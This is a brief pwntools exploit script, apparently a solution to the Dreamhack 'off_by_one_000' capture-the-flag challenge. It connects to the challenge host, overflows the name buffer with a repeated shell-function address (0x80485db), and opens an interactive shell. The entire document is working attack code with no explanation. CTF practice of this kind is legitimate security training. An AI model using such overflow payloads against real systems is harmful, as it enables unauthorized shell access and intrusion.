from pwn import *

p = remote('host3.dreamhack.games', '11751')
#p = process('./off_by_one_000')

shell = 0x80485db

payload = p32(shell) * 0x40
p.sendlineafter(b"Name: ", payload)
p.interactive()